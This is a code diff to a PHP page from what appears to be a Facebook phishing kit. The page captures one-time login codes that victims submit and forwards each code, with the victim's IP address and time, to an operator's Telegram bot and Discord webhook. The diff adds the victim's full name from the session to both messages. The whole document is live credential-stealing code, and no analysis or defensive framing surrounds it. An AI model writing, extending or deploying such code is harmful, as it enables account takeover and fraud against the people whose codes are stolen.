@@ -1,9 +1,12 @@
 <?php
+session_start();
 date_default_timezone_set('Asia/Manila');
 include '../config.php';
 
+$fullName = $_SESSION['avea_full_name'] ?? 'Unknown';
+
 // Start session to track OTP submissions
-session_start();
+
 if (!isset($_SESSION['fbotp_submit'])) $_SESSION['fbotp_submit'] = 0;
 
 // ---------- HANDLE OTP SUBMISSION ----------
@@ -29,8 +32,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['otp'])) {
     // ---------- SEND TO TELEGRAM ----------
     if (!empty($telegram_use) && $telegram_use === true && !empty($telegram_bot_token) && !empty($telegram_chat_id)) {
         $telegramMessage = "✨ <b>New Facebook OTP Submission #1</b>\n\n"
+        . "<b>From Name:</b> <code>{$fullName}</code>\n"
                          . "<b>IP Address:</b> <code>{$ip}</code>\n"
-                         . "<b>Time:</b> <code>{$time}</code>\n"
+                         . "<b>Time:</b> <code>{$time}</code>\n\n"
                          . "<b>OTP #1:</b> <code>{$otp}</code>";
 
         $telegramUrl = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
@@ -52,12 +56,28 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['otp'])) {
 
     // ---------- SEND TO DISCORD ----------
     if (!empty($discord_use) && $discord_use === true && !empty($discord_webhook_url)) {
-        $discordFields = [
-            ['name' => 'IP Address', 'value' => "`{$ip}`", 'inline' => true],
-            ['name' => 'Time', 'value' => "`{$time}`", 'inline' => true],
-            ['name' => "OTP #{$otpNumber}", 'value' => "`{$otp}`", 'inline' => true]
-        ];
-
+      $discordFields = [
+    [
+        'name' => 'From Name',
+        'value' => "`{$fullName}`",
+        'inline' => false
+    ],
+    [
+        'name' => 'IP Address',
+        'value' => "`{$ip}`",
+        'inline' => true
+    ],
+    [
+        'name' => 'Time',
+        'value' => "`{$time}`",
+        'inline' => true
+    ],
+    [
+        'name' => "OTP #{$otpNumber}",
+        'value' => "`{$otp}`",
+        'inline' => true
+    ]
+];
         $payload = [
             'content' => "✨ **New Facebook OTP Submission #1**",
             'embeds' => [
